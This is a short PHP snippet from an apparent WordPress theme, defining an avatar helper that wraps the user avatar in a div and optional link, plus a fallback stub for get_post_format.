if (!function_exists('theme_get_avatar')){
	function theme_get_avatar($args = ''){
	$args = wp_parse_args($args, array('id' => false, 'size' => 96, 'default' => '', 'alt' => false, 'url' => false));
	extract($args);
		$result = get_avatar($id, $size, $default, $alt);
		if ($result) {
			if ($url){
				$result = '<a href="'.esc_url($url).'">' . $result . '</a>';
			}
			$result = '<div class="avatar">' . $result . '</div>';
		}
		return $result;
	}
}

if (!function_exists('get_post_format')){
	function get_post_format(){
		return false;
	}
}